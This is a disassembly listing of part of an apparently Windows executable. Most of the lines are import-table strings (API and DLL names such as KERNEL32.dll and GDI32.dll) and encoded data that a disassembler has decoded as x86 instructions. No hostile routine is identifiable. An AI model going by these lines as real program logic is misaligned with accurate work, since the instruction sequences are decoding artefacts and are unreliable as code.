  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
  41439c:	dec    edi
  41439d:	bound  ebp,QWORD PTR [edx+0x65]
  4143a0:	arpl   WORD PTR [eax+eax*1+0x0],si
  4143a4:	mov    al,ds:0x65724300
  4143a9:	popa   
  4143aa:	je     0x414411
  4143ac:	dec    eax
  4143ad:	popa   
  4143ae:	je     0x414413
  4143b0:	push   0x73757242
  4143b5:	push   0xaa0000
  4143ba:	inc    ebx
  4143bb:	jb     0x414422
  4143bd:	popa   
  4143be:	je     0x414425
  4143c0:	push   eax
  4143c1:	outs   dx,DWORD PTR ds:[esi]
  4143c2:	ins    BYTE PTR es:[edi],dx
  4143c3:	jns    0x41442c
  4143c5:	outs   dx,DWORD PTR ds:[esi]
  4143c6:	outs   dx,BYTE PTR ds:[esi]
  4143c7:	push   edx
  4143c8:	outs   dx,BYTE PTR ds:[si]
  4143ca:	add    BYTE PTR [eax],al
  4143cc:	add    DWORD PTR [eax],0x626d6f43
  4143d2:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  4143d9:	add    dl,dl
  4143db:	add    DWORD PTR [ebx+0x65],edx
  4143de:	je     0x414422
  4143e0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4143e8:	jae    0x4143ea
  4143ea:	lods   al,BYTE PTR ds:[esi]
  4143eb:	add    DWORD PTR [eax+0x6f],edx
  4143ee:	ins    BYTE PTR es:[edi],dx
  4143ef:	jns    0x414433
  4143f1:	gs jp  0x41445d
  4143f4:	gs jb  0x4143f7
  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
